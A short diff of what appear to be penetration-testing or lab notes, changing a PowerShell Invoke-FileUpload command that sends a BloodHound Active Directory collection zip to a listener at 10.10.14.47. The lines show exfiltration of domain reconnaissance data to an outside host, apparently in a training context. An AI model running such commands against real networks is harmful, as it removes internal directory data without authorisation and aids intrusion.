@@ -183,7 +183,7 @@ Invoke-FileUpload -Uri http://10.10.14.47:8000/upload -File "20240629101749_Bloo
 ![[Pasted image 20240629132729.png]]
 
 
-Invoke-FileUpload -Uri http://10.10.14.47:8000/upload -File "20240629110118_BloodHound.zip"
+Invoke-FileUpload -Uri http://10.10.14.47:8000/blood -File "20240629110118_BloodHound.zip"
 
 
 
